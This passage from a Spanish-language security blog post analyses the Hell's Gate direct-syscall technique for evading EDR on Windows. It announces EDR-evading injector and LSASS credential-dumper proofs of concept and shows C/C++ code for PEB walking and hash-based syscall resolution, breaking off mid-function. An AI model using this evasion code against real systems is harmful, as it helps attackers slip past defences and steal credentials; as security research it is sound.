@@ -1,0 +1,692 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>La Rueda de Ezequiel (Análisis de la Puerta del Infierno) // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="La Rueda de Ezequiel (Análisis de la Puerta del Infierno)">
+  <meta name="twitter:description" content="Lo que sucede es mi análisis de la Puerta del Infierno, un código maligno. Este código maligno contiene técnicas que le da la capacidad de ejecutar llamadas de sistema (syscalls) en el sistema de operación Windows, con el objetivo de evadir detección de EDR (Defensas de las Empresas).
+Una vez completé mi análisis, creé mi propia implementación en C&#43;&#43; que usa llamadas de sistema (syscalls) que pertenecer adrento de ntdll.dll. Además, un método diferente de lo conocido públicamente para crear hashes.">
+
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/tronos/">
+  <meta property="og:site_name" content="wetw0rk">
+  <meta property="og:title" content="La Rueda de Ezequiel (Análisis de la Puerta del Infierno)">
+  <meta property="og:description" content="Lo que sucede es mi análisis de la Puerta del Infierno, un código maligno. Este código maligno contiene técnicas que le da la capacidad de ejecutar llamadas de sistema (syscalls) en el sistema de operación Windows, con el objetivo de evadir detección de EDR (Defensas de las Empresas).
+Una vez completé mi análisis, creé mi propia implementación en C&#43;&#43; que usa llamadas de sistema (syscalls) que pertenecer adrento de ntdll.dll. Además, un método diferente de lo conocido públicamente para crear hashes.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-11-24T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
+      <span class="app-header-title"></span>
+      <p> </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">La Rueda de Ezequiel (Análisis de la Puerta del Infierno)</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Nov 24, 2024
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          16 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Lo que sucede es mi análisis de <a href="https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf"><em>la Puerta del Infierno</em></a>, un código maligno. Este código maligno contiene técnicas que le da la capacidad de ejecutar llamadas de sistema (syscalls) en el sistema de operación Windows, con el objetivo de evadir detección de EDR (Defensas de las Empresas).</p>
+<p>Una vez completé mi análisis, creé mi propia implementación en C++ que usa llamadas de sistema (syscalls) que pertenecer adrento de <em>ntdll.dll</em>. Además, un método diferente de lo conocido públicamente para crear hashes. Todo esto para evadir técnicas modernas de detección para estos tipos de técnicas.</p>
+<p>Existen, más formas de optimización, sin embargo, para ahorrar tiempo, solo dos prueba de conceptos (PoC&rsquo;s) fueron creados.</p>
+<ol>
+<li>En el año 2024, un basico inyector de código que evade EDR</li>
+<li>En el año 2024, un LSASS extractor para recuperar contraseñas que evade Windows Defender</li>
+</ol>
+<p>El extractor de LSASS puede ser optimizado para evade EDR pero, dejo esto para servir como un ejercicio.</p>
+<h1 id="tabla-de-contenido">Tabla de Contenido</h1>
+<ul>
+<li><a href="#descargo-de-responsabilidad">Descargo de Responsabilidad</a></li>
+<li><a href="#entendiendo-el-c%C3%B3digo-maligno">Entendiendo el Código Maligno</a>
+<ul>
+<li><a href="#get-ntdll---la-entrada-del-m%C3%B3dulo">Get NTDLL - La Entrada del Módulo</a></li>
+<li><a href="#obtener-la-tabla-de-direcciones-de-exportaci%C3%B3n-eat-para-ntdll">Obtener la tabla de direcciones de exportación (EAT) para NTDLL</a></li>
+<li><a href="#obteniendo-entendimiento-de-getvxtableentry">Obteniendo Entendimiento de GetVxTableEntry()</a></li>
+<li><a href="#obteniendo-entendimiento-de-payload">Obteniendo Entendimiento de Payload()</a></li>
+<li><a href="#obteniendo-entendimiento-de-payload">Obteniendo Entendimiento de HellsGate</a></li>
+<li><a href="#obteniendo-entendimiento-de-hellsgate">Obteniendo Entendimiento de HellsDescent</a></li>
+</ul>
+</li>
+<li><a href="#poc--valm---ezekiels-wheel">PoC | VALM - (Ezekiels Wheel)</a></li>
+<li><a href="#recursos">Recursos</a></li>
+</ul>
+<h1 id="descargo-de-responsabilidad">Descargo de Responsabilidad</h1>
+<p>Copyright 2024 Milton Valencia
+Por la presente se concede permiso, libre de cargos, a cualquier persona que obtenga una copia de este software y de los archivos de documentación asociados (el &ldquo;Software&rdquo;), a utilizar el Software sin restricción, incluyendo sin limitación los derechos a usar, copiar, modificar, fusionar, publicar, distribuir, sublicenciar, y/o vender copias del Software, y a permitir a las personas a las que se les proporcione el Software a hacer lo mismo, sujeto a las siguientes condiciones:</p>
+<p>El aviso de copyright anterior y este aviso de permiso se incluirán en todas las copias o partes sustanciales del Software.</p>
+<p>EL SOFTWARE SE PROPORCIONA &ldquo;COMO ESTÁ&rdquo;, SIN GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA, INCLUYENDO PERO NO LIMITADO A GARANTÍAS DE COMERCIALIZACIÓN, IDONEIDAD PARA UN PROPÓSITO PARTICULAR E INCUMPLIMIENTO. EN NINGÚN CASO LOS AUTORES O PROPIETARIOS DE LOS DERECHOS DE AUTOR SERÁN RESPONSABLES DE NINGUNA RECLAMACIÓN, DAÑOS U OTRAS RESPONSABILIDADES, YA SEA EN UNA ACCIÓN DE CONTRATO, AGRAVIO O CUALQUIER OTRO MOTIVO, DERIVADAS DE, FUERA DE O EN CONEXIÓN CON EL SOFTWARE O SU USO U OTRO TIPO DE ACCIONES EN EL SOFTWARE.</p>
+<h1 id="entendiendo-el-código-maligno">Entendiendo el Código Maligno</h1>
+<p>Empecé bajando una copia de el código que contiene la técnica proporcionado por <a href="https://github.com/am0nsec/HellsGate">am0nsec</a>. Quería romper esto línea por línea, empesando con la función <em>main()</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>INT <span style="color:#a6e22e">wmain</span>() {
+</span></span><span style="display:flex;"><span>        PTEB pCurrentTeb <span style="color:#f92672">=</span> <span style="color:#a6e22e">RtlGetThreadEnvironmentBlock</span>();
+</span></span><span style="display:flex;"><span>        PPEB pCurrentPeb <span style="color:#f92672">=</span> pCurrentTeb<span style="color:#f92672">-&gt;</span>ProcessEnvironmentBlock;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pCurrentPeb <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pCurrentTeb <span style="color:#f92672">||</span> pCurrentPeb<span style="color:#f92672">-&gt;</span>OSMajorVersion <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xA</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Get NTDLL module 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PLDR_DATA_TABLE_ENTRY pLdrDataEntry <span style="color:#f92672">=</span> (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb<span style="color:#f92672">-&gt;</span>LoaderData<span style="color:#f92672">-&gt;</span>InMemoryOrderModuleList.Flink<span style="color:#f92672">-&gt;</span>Flink <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Get the EAT of NTDLL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        PIMAGE_EXPORT_DIRECTORY pImageExportDirectory <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetImageExportDirectory</span>(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, <span style="color:#f92672">&amp;</span>pImageExportDirectory) <span style="color:#f92672">||</span> pImageExportDirectory <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x01</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        VX_TABLE Table <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>        Table.NtAllocateVirtualMemory.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf5bd373480a6b89b</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetVxTableEntry</span>(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtAllocateVirtualMemory))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Table.NtCreateThreadEx.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x64dc7db288c5015f</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetVxTableEntry</span>(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtCreateThreadEx))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Table.NtProtectVirtualMemory.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x858bcb1046fb6a37</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetVxTableEntry</span>(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtProtectVirtualMemory))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Table.NtWaitForSingleObject.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc6a2fa174e551bcb</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetVxTableEntry</span>(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtWaitForSingleObject))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Payload</span>(<span style="color:#f92672">&amp;</span>Table);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Parece que el primer paso es &ldquo;Get NTDLL&rdquo;.</p>
+<h2 id="get-ntdll---la-entrada-del-módulo">Get NTDLL - La Entrada del Módulo</h2>
+<p>Para comprender mejor cómo se logró esto usé el código presentado.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    PTEB pTeb <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetThreadEnvironmentBlock</span>();
+</span></span><span style="display:flex;"><span>    PPEB pPeb <span style="color:#f92672">=</span> pTEB<span style="color:#f92672">-&gt;</span>ProcessEnvironmentBlock;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[*] Testing on OS Version: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> pPeb<span style="color:#f92672">-&gt;</span>OSMajorVersion <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    PLDR_DATA_TABLE_ENTRY pLdrDataEntry <span style="color:#f92672">=</span> (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB<span style="color:#f92672">-&gt;</span>LoaderData<span style="color:#f92672">-&gt;</span>InMemoryOrderModuleList.Flink <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[*] pLdrDataEntry: 0x&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#66d9ef">uint64_t</span>)pLdrDataEntry <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Por el bein de tiempo estructuras (structures) sólo serán mencionado cuando es relevante. Una vez que lo ejecutamos, vemos esto:</p>
+<pre tabindex="0"><code>C:\Users\developer\Desktop&gt;hg.exe 
+[*] Testing on OS Version: 10
+[*] pLdrDataEntry: 0x26f94d06020
+</code></pre><p>Pero&hellip; qué es esto? Si nos detenemos en WinDbg, podemos llegar al <code>PEB</code> usando <code>!process 0 0 hg.exe</code>. Donde debemos concentrarnos es en el <code>InMemoryOrderModuleList</code>.</p>
+<p><img src="/EzekielsWheelScreenshots/process.png" alt="alt text"></p>
+<p>Podemos ver que esto es muy similar a lo que vimos antes. Además, si restamos <strong>0x10</strong> de esta dirección, vemos que son similares.</p>
+<p><img src="/EzekielsWheelScreenshots/dump.png" alt="alt text"></p>
+<p>A primer vista, esto no los dice mucho. Sin embargo, cada entrada de la lista en realidad está envuelta en una estructura de <code>LDR_DATA_TABLE_ENTRY</code>. Entonces, podemos obtener más contexto sacando la estructura ubicada en el puntero de <code>FLINK</code>.</p>
+<p><img src="/EzekielsWheelScreenshots/ntdll.png" alt="alt text"></p>
+<p>La información presentada confirma que esta es la entrada al módulo NTDLL. En esencia esto:</p>
+<ol>
+<li>Utilice el registro GS para obtener la dirección de el TEB</li>
+<li>El TEB contiene la dirección para el PEB</li>
+<li>Con el PEB podemos obtener la dirección a la estructura PEB_LDR_DATA</li>
+<li>Usando el PEB_LDR_DATA podemos obtener el InMemoryOrderModuleList</li>
+</ol>
+<p>Podemos proceder a implementar código para recorrer la lista doblemente enlazada utilizando nuestro nuevo conocimiento. Es aconsejable hacerlo asi, porque no tenemos garantía de que <code>ntdll.dll</code> siempre estará cargado a distancia <code>-0x10</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    PTEB pTeb <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PPEB pPeb <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PLIST_ENTRY pEntry <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PLIST_ENTRY pHeadEntry <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PPEB_LDR_DATA pLdrData <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PLDR_DATA_TABLE_ENTRY pLdrEntry <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Get the TEB */</span>
+</span></span><span style="display:flex;"><span>    pTeb <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetThreadEnvironmentBlock</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Get the PEB */</span>
+</span></span><span style="display:flex;"><span>    pPeb <span style="color:#f92672">=</span> pTeb<span style="color:#f92672">-&gt;</span>ProcessEnvironmentBlock;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* OS Version Detection Omitted */</span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[*] Testing on OS Version: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> pPeb<span style="color:#f92672">-&gt;</span>OSMajorVersion <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Obtain a pointer to the structure that contains information about the loaded modules for a given process */</span>
+</span></span><span style="display:flex;"><span>    pLdrData <span style="color:#f92672">=</span> pPeb<span style="color:#f92672">-&gt;</span>LoaderData;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Get the pointer to the InMemoryOrderModuleList which is a doubly-linked list that contains
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       the loaded modules for the process */</span>
+</span></span><span style="display:flex;"><span>    pHeadEntry <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>pLdrData<span style="color:#f92672">-&gt;</span>InMemoryOrderModuleList;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Iterate over the InMemoryOrderModuleList */</span>
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>wcout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">InMemoryOrderModuleList</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>wcout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Base</span><span style="color:#ae81ff">\t\t\t</span><span style="color:#e6db74">Module</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (pEntry <span style="color:#f92672">=</span> pHeadEntry<span style="color:#f92672">-&gt;</span>Flink; pEntry <span style="color:#f92672">!=</span> pHeadEntry; pEntry <span style="color:#f92672">=</span> pEntry<span style="color:#f92672">-&gt;</span>Flink)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        pLdrDataTableEntry <span style="color:#f92672">=</span> (PLDR_DATA_TABLE_ENTRY)pEntry;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>wcout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>hex <span style="color:#f92672">&lt;&lt;</span> pLdrDataTableEntry<span style="color:#f92672">-&gt;</span>DllBase <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;&lt;</span> pLdrDataTableEntry<span style="color:#f92672">-&gt;</span>FullDllName.Buffer
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Que bueno, podemos ver que nuestro código funciona.</p>
+<p><img src="/EzekielsWheelScreenshots/traversing_linked_list.png" alt="alt text"></p>
+<p>Sin embargo, todavía necesitamos que devuelva el valor original del código que bajamos. este valor es la dirección de la LIST_ENTRY. Modifiquemos nuestro código una vez más, esta vez creando una función para obtener la entrada dinámicamente.</p>
+<p>Al escribir esto, observé que el último código que escribimos era incorrecto para analizar cada entrada. Para alcanzar adecuadamente una entrada LDR_DATA_TABLE_ENTRY, nosotros debemos restar 0x10 del módulo que encontramos porque la dirección de el Flink NO ES el primer miembro de la estructura.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>PLDR_DATA_TABLE_ENTRY <span style="color:#a6e22e">GetNtdllTableEntry</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    PTEB pTeb <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PPEB pPeb <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    DWORD dwModuleHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>    DWORD dwDllNameSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>    DWORD dwRorOperations <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>    PLIST_ENTRY pEntry <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PLIST_ENTRY pHeadEntry <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PPEB_LDR_DATA pLdrData <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PLDR_DATA_TABLE_ENTRY pLdrEntry <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Get the TEB */</span>
+</span></span><span style="display:flex;"><span>    pTeb <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetThreadEnvironmentBlock</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Get the PEB */</span>
+</span></span><span style="display:flex;"><span>    pPeb <span style="color:#f92672">=</span> pTeb<span style="color:#f92672">-&gt;</span>ProcessEnvironmentBlock;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Obtain a pointer to the structure that contains information about the loaded modules for a given process */</span>
+</span></span><span style="display:flex;"><span>    pLdrData <span style="color:#f92672">=</span> pPeb<span style="color:#f92672">-&gt;</span>LoaderData;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Get the pointer to the InMemoryOrderModuleList which is a doubly-linked list that contains
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       the loaded modules for the process */</span>
+</span></span><span style="display:flex;"><span>    pHeadEntry <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>pLdrData<span style="color:#f92672">-&gt;</span>InMemoryOrderModuleList;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Iterate over the InMemoryOrderModuleList and identify NTDLL */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (pEntry <span style="color:#f92672">=</span> pHeadEntry<span style="color:#f92672">-&gt;</span>Flink; pEntry <span style="color:#f92672">!=</span> pHeadEntry; pEntry <span style="color:#f92672">=</span> pEntry<span style="color:#f92672">-&gt;</span>Flink)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* If I understood correctly we must subtract 16 from the ntdll.dll entry in the InMemoryModuleList. This
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">           is neccessary because the Flink is not the first member of the LDR_DATA_TABLE_ENTRY structure, so when
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">           subtracting 0x10 we get the start of the structure for ntdll.dll */</span>
+</span></span><span style="display:flex;"><span>        pLdrDataTableEntry <span style="color:#f92672">=</span> (PLDR_DATA_TABLE_ENTRY)((std<span style="color:#f92672">::</span><span style="color:#66d9ef">int64_t</span>)pEntry<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Calculate a hash for the given DLL name */</span>
+</span></span><span style="display:flex;"><span>        dwDllNameSize <span style="color:#f92672">=</span> (pLdrDataTableEntry<span style="color:#f92672">-&gt;</span>BaseDllName.Length) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">wchar_t</span>);
+</span></span><span style="display:flex;"><span>        dwRorOperations <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>        dwModuleHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Hash the DLL name for identification */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDllNameSize; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>        {
